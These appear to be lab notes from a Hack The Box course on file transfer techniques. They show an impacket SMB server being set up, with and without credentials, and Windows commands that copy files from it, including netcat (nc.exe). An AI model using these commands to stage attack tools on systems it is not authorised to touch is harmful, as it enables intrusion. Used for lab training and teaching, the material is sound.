
#### Create the SMB Server
```shell-session
AhmaDb0x@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

#### Copy a File from the SMB Server
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe
```
---
New versions of Windows block unauthenticated guest access, as we can see in the following command:

#### Create the SMB Server with a Username and Password
```shell
AhmaDb0x@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare 
-user `test` -password `test`
```

#### Mount the SMB Server with Username and Password
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

copy \\10.10.15.83\share\upload_win.zip C:\Users\htb-student\Desktop


```

```
**Note:** You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.
```

